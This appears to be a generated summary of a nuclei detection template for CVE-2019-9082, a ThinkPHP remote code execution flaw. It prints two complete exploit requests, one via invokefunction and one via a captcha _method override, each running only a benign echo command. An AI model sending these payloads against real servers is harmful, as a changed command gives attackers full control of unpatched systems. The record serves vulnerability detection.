---
cve_id: CVE-2019-9082
template_path: nuclei-templates/http/cves/2019/CVE-2019-9082.yaml
affected_product: ThinkPHP
severity: high
authentication: none
external_callback: false
affected_versions: < 3.2.4
preconditions: []
poc_classification: rce
---

## Vulnerability
ThinkPHP before 3.2.4 (as used in Open Source BMS v1.1.1 and other products) allows unauthenticated remote command execution via the `s` parameter in `index.php` through the `invokefunction` functionality. Attackers can execute arbitrary system commands on the server, leading to full system compromise. CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (score 8.8), CWE-94.

## PoC / Detection
Classification: rce  
The template verifies the flaw by issuing two raw HTTP requests (stop-at-first-match) that trigger execution of the harmless command `echo thinkphp | rev`:  
- GET `/index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=echo%20thinkphp%20%7C%20rev`  
- POST `/index.php?s=captcha` (Content-Type application/x-www-form-urlencoded) with `_method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=echo%20thinkphp%20%7C%20rev`  
Matchers check for the reversed string `phpkniht` in the response body and status code 200 or 500.

## References
- https://github.com/xyl-tools/open_source_bms/issues/33
- http://packetstormsecurity.com/files/157218/ThinkPHP-5.0.23-Remote-Code-Execution.html
- https://www.exploit-db.com/exploits/46488/
- https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/webapp/thinkphp_rce.rb
- https://nvd.nist.gov/vuln/detail/CVE-2019-9082
